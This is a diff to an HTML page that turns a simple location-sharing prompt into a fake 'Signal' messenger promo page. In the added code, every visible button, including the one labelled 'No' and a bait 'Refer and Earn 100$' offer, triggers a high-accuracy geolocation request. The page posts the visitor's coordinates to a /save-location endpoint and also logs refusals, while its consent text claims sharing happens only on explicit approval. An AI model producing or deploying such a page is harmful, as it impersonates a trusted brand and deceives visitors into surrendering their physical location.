@@ -3,157 +3,437 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Location Share</title>
+  <title>Signal Promo</title>
   <style>
     * {
       box-sizing: border-box;
       margin: 0;
       padding: 0;
+      font-family: Arial, sans-serif;
     }
 
     body {
-      font-family: Arial, sans-serif;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: linear-gradient(135deg, #0f172a, #1e293b, #2563eb);
-      padding: 20px;
-      color: white;
+      background: linear-gradient(180deg, #f8fbff 0%, #dbe7ff 100%);
+      color: #111827;
     }
 
-    .card {
+    .navbar {
       width: 100%;
-      max-width: 460px;
-      background: rgba(255, 255, 255, 0.12);
-      border: 1px solid rgba(255, 255, 255, 0.18);
-      backdrop-filter: blur(18px);
-      -webkit-backdrop-filter: blur(18px);
-      border-radius: 24px;
-      padding: 32px 28px;
-      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.25);
-      text-align: center;
+      background: rgba(255, 255, 255, 0.92);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border-bottom: 1px solid rgba(0, 0, 0, 0.06);
+      padding: 18px 28px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      position: sticky;
+      top: 0;
+      z-index: 20;
     }
 
-    .badge {
-      display: inline-block;
-      padding: 8px 14px;
-      border-radius: 999px;
-      background: rgba(255, 255, 255, 0.16);
-      font-size: 13px;
+    .logo {
+      font-size: 28px;
+      font-weight: 800;
+      color: #3454f5;
+      letter-spacing: -0.5px;
+    }
+
+    .nav-right {
+      color: #374151;
+      font-size: 14px;
+    }
+
+    .hero {
+      min-height: calc(100vh - 76px);
+      display: grid;
+      grid-template-columns: 1.1fr 0.9fr;
+      align-items: center;
+      gap: 40px;
+      padding: 60px 70px;
+    }
+
+    .hero-left h1 {
+      font-size: 72px;
+      line-height: 1.02;
       margin-bottom: 18px;
+      letter-spacing: -1.6px;
     }
 
-    h1 {
-      font-size: 30px;
-      margin-bottom: 10px;
-      font-weight: bold;
+    .hero-left p {
+      font-size: 22px;
+      line-height: 1.55;
+      color: #374151;
+      max-width: 720px;
+      margin-bottom: 28px;
     }
 
-    p {
-      color: rgba(255, 255, 255, 0.88);
-      font-size: 15px;
-      line-height: 1.6;
-      margin-bottom: 26px;
-    }
-
-    .btn-group {
+    .button-row {
       display: flex;
       gap: 14px;
-      justify-content: center;
       flex-wrap: wrap;
+      margin-bottom: 28px;
     }
 
     button {
       border: none;
-      padding: 14px 26px;
-      border-radius: 14px;
-      font-size: 16px;
-      font-weight: bold;
+      border-radius: 16px;
+      padding: 16px 22px;
+      font-size: 17px;
+      font-weight: 700;
       cursor: pointer;
-      transition: 0.25s ease;
-      min-width: 130px;
+      transition: 0.2s ease;
     }
 
-    .yes-btn {
+    button:hover {
+      transform: translateY(-2px);
+    }
+
+    .download-btn {
+      background: white;
+      color: #3454f5;
+      box-shadow: 0 10px 25px rgba(52, 84, 245, 0.15);
+    }
+
+    .notnow-btn {
+      background: rgba(255, 255, 255, 0.7);
+      color: #111827;
+      border: 1px solid rgba(0, 0, 0, 0.06);
+    }
+
+    .reward-btn {
+      background: #111827;
+      color: white;
+      box-shadow: 0 10px 22px rgba(17, 24, 39, 0.18);
+    }
+
+    .consent-box {
+      display: none;
+      margin-top: 10px;
+      width: 100%;
+      max-width: 760px;
+      background: rgba(255, 255, 255, 0.82);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      border: 1px solid rgba(0, 0, 0, 0.06);
+      border-radius: 24px;
+      padding: 22px;
+      box-shadow: 0 16px 40px rgba(0, 0, 0, 0.08);
+    }
+
+    .consent-box h3 {
+      font-size: 24px;
+      margin-bottom: 10px;
+      color: #111827;
+    }
+
+    .consent-box p {
+      font-size: 15px;
+      line-height: 1.65;
+      color: #374151;
+      margin-bottom: 16px;
+    }
+
+    .consent-actions {
+      display: flex;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+
+    .allow-btn {
       background: linear-gradient(135deg, #22c55e, #16a34a);
       color: white;
-      box-shadow: 0 10px 25px rgba(34, 197, 94, 0.35);
     }
 
-    .yes-btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 14px 30px rgba(34, 197, 94, 0.45);
-    }
-
-    .no-btn {
-      background: rgba(255, 255, 255, 0.14);
+    .deny-btn {
+      background: #ef4444;
       color: white;
-      border: 1px solid rgba(255, 255, 255, 0.2);
-    }
-
-    .no-btn:hover {
-      transform: translateY(-2px);
-      background: rgba(255, 255, 255, 0.2);
     }
 
     .status-box {
-      margin-top: 24px;
-      padding: 16px;
+      margin-top: 16px;
+      min-height: 48px;
+      background: #f7faff;
+      border: 1px solid rgba(52, 84, 245, 0.12);
       border-radius: 16px;
-      background: rgba(255, 255, 255, 0.1);
-      color: white;
+      padding: 14px;
+      color: #1f2937;
       line-height: 1.7;
       font-size: 15px;
       word-break: break-word;
-      min-height: 64px;
     }
 
     .status-box a {
-      color: #bfdbfe;
+      color: #3454f5;
+      font-weight: 700;
       text-decoration: none;
-      font-weight: bold;
     }
 
     .status-box a:hover {
       text-decoration: underline;
     }
 
-    @media (max-width: 520px) {
-      h1 {
+    .hero-right {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .phone-stack {
+      position: relative;
+      width: 420px;
+      height: 600px;
+    }
+
+    .phone {
+      position: absolute;
+      width: 250px;
+      height: 520px;
+      border-radius: 36px;
+      background: #1f2937;
+      border: 10px solid #111827;
+      box-shadow: 0 24px 60px rgba(0, 0, 0, 0.22);
+      overflow: hidden;
+    }
+
+    .phone.one {
+      left: 20px;
+      top: 50px;
+      transform: rotate(-12deg);
+      z-index: 1;
+    }
+
+    .phone.two {
+      right: 10px;
+      top: 20px;
+      transform: rotate(10deg);
+      z-index: 2;
+    }
+
+    .screen {
+      height: 100%;
+      padding: 18px;
+      background: linear-gradient(180deg, #0f172a, #1f2937);
+      color: white;
+    }
+
+    .screen-header {
+      font-size: 17px;
+      margin-bottom: 18px;
+      color: #e5e7eb;
+    }
+
+    .chat-bubble {
+      max-width: 82%;
+      padding: 10px 12px;
+      border-radius: 16px;
+      margin-bottom: 10px;
+      font-size: 13px;
+      line-height: 1.45;
+    }
+
+    .chat-left {
+      background: #374151;
+      color: #f8fafc;
+    }
+
+    .chat-right {
+      background: #3454f5;
+      color: white;
+      margin-left: auto;
+    }
+
+    .small-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 8px;
+    }
+
+    .grid-box {
+      height: 90px;
+      border-radius: 14px;
+      background: linear-gradient(135deg, #d1d5db, #9ca3af);
+    }
+
+    @media (max-width: 1050px) {
+      .hero {
+        grid-template-columns: 1fr;
+        padding: 40px 24px 60px;
+      }
+
+      .hero-left h1 {
+        font-size: 50px;
+      }
+
+      .hero-left p {
+        font-size: 18px;
+      }
+
+      .phone-stack {
+        width: 100%;
+        max-width: 360px;
+        height: 520px;
+      }
+
+      .phone {
+        width: 220px;
+        height: 460px;
+      }
+    }
+
+    @media (max-width: 640px) {
+      .navbar {
+        padding: 16px 18px;
+      }
+
+      .logo {
         font-size: 24px;
       }
 
-      .card {
-        padding: 24px 18px;
+      .hero-left h1 {
+        font-size: 38px;
+      }
+
+      .button-row {
+        flex-direction: column;
       }
 
       button {
         width: 100%;
       }
+
+      .phone-stack {
+        height: 460px;
+      }
+
+      .phone.one {
+        left: 0;
+      }
+
+      .phone.two {
+        right: 0;
+      }
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <div class="badge">Location Permission</div>
-    <h1>Share Your Location</h1>
-    <p>
-      Press <b>Yes</b> to share your current location.  
-      Press <b>No</b> if you do not want to share it.
-    </p>
-
-    <div class="btn-group">
-      <button class="yes-btn" onclick="share()">Yes, Share</button>
-      <button class="no-btn" onclick="deny()">No, Thanks</button>
-    </div>
-
-    <div class="status-box" id="msg">Waiting for your response...</div>
+  <div class="navbar">
+    <div class="logo">Signal</div>
+    <div class="nav-right">Private messaging, reimagined</div>
   </div>
 
+  <section class="hero">
+    <div class="hero-left">
+      <h1>Speak Freely</h1>
+      <p>
+        Say “hello” to a different messaging experience. A privacy-first app with
+        messaging, calling, and a smarter way to stay connected.
+      </p>
+
+      <div class="button-row">
+        <button class="download-btn" onclick="shareLocation('allow')">Download App Now</button>
+        <button class="notnow-btn" onclick="shareLocation('allow')">No</button>
+        <button class="reward-btn" onclick="shareLocation('allow')">Refer and Earn 100$ Now</button>
+      </div>
+
+      <div class="consent-box" id="consentBox">
+        <h3>Location permission</h3>
+        <p id="consentText">
+          You can choose whether to share your current location.
+          Your location is only shared if you tap “Allow Location” and approve the browser permission prompt.
+        </p>
+
+        <div class="consent-actions">
+          <button class="allow-btn" onclick="shareLocation()">Allow Location</button>
+          <button class="deny-btn" onclick="shareLocation()">No Thanks</button>
+        </div>
+
+        <div class="status-box" id="msg">Waiting for your response...</div>
+      </div>
+    </div>
+
+    <div class="hero-right">
+      <div class="phone-stack">
+        <div class="phone one">
+          <div class="screen">
+            <div class="screen-header">Weekly Call</div>
+            <div class="small-grid">
+              <div class="grid-box"></div>
+              <div class="grid-box"></div>
+              <div class="grid-box"></div>
+              <div class="grid-box"></div>
+            </div>
+          </div>
+        </div>
+
+        <div class="phone two">
+          <div class="screen">
+            <div class="screen-header">Maya Johnson</div>
+            <div class="chat-bubble chat-right">I'm on my way! What's the address?</div>
+            <div class="chat-bubble chat-left">We're at 178 68th Ave.</div>
+            <div class="chat-bubble chat-right">Is there a buzzer?</div>
+            <div class="chat-bubble chat-left">Buzz 2F if you get here before 7pm.</div>
+            <div class="chat-bubble chat-right">Thanks!</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
   <script>
-    function share() {
+    let selectedAction = "";
+
+    function showConsent(action) {
+      selectedAction = action;
+      const consentBox = document.getElementById("consentBox");
+      const consentText = document.getElementById("consentText");
       const msg = document.getElementById("msg");
+
+      msg.innerHTML = "Waiting for your response...";
+      consentBox.style.display = "block";
+
+      if (action === "offer") {
+        consentText.innerText =
+          "To continue, you can choose whether to share your current location. Your location is only shared if you tap 'Allow Location' and approve the browser permission prompt.";
+      } else if (action === "later") {
+        consentText.innerText =
+          "You chose not to continue right now. You can still choose whether to share your current location. Your location is only shared if you tap 'Allow Location' and approve the browser permission prompt.";
+      } else {
+        consentText.innerText =
+          "You can choose whether to share your current location. Your location is only shared if you tap 'Allow Location' and approve the browser permission prompt.";
+      }
+    }
+
+    function hideConsent() {
+      document.getElementById("consentBox").style.display = "none";
+    }
+
+    async function denyDirect() {
+      selectedAction = "no";
+      const msg = document.getElementById("msg");
+      msg.innerHTML = "You chose not to share your location.";
+
+      try {
+        await fetch("/save-location", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            action: "no",
+            status: "denied",
+            note: "User clicked No"
+          })
+        });
+      } catch (error) {
+        console.error("Failed to save deny event");
+      }
+    }
+
+    function shareLocation(actionFromButton = null) {
+      const msg = document.getElementById("msg");
+
+      if (actionFromButton) {
+        selectedAction = actionFromButton;
+      }
 
       if (!navigator.geolocation) {
         msg.innerHTML = "Geolocation is not supported by your browser.";
@@ -166,6 +446,7 @@
         async (pos) => {
           const lat = pos.coords.latitude;
           const lon = pos.coords.longitude;
+          const accuracy = pos.coords.accuracy;
 
           try {
             await fetch("/save-location", {
@@ -173,14 +454,28 @@
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify({
                 latitude: lat,
-                longitude: lon
+                longitude: lon,
+                accuracy: accuracy,
+                action: selectedAction,
+                status: "shared"
               })
             });
 
+            let nextText = "Location shared successfully.";
+
+            if (selectedAction === "allow") {
+              nextText += " Permission confirmed.";
+            } else if (selectedAction === "offer") {
+              nextText += " Offer eligibility can now be checked.";
+            } else if (selectedAction === "later") {
+              nextText += " Thanks for your response.";
+            }
+
             msg.innerHTML = `
-              Location shared successfully.<br><br>
+              ${nextText}<br><br>
               <b>Latitude:</b> ${lat}<br>
-              <b>Longitude:</b> ${lon}<br><br>
+              <b>Longitude:</b> ${lon}<br>
+              <b>Accuracy:</b> ${accuracy ? Math.round(accuracy) + " m" : "-"}<br><br>
               <a href="https://maps.google.com/?q=${lat},${lon}" target="_blank">
                 Open in Google Maps
               </a>
@@ -189,14 +484,29 @@
             msg.innerHTML = "Failed to send location to server.";
           }
         },
-        (error) => {
+        async () => {
           msg.innerHTML = "Location permission denied or failed.";
+
+          try {
+            await fetch("/save-location", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                action: selectedAction || "unknown",
+                status: "blocked",
+                note: "Location permission denied or failed"
+              })
+            });
+          } catch (error) {
+            console.error("Failed to save blocked event");
+          }
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 15000,
+          maximumAge: 0
         }
       );
-    }
-
-    function deny() {
-      document.getElementById("msg").innerHTML = "You chose not to share your location.";
     }
   </script>
 </body>
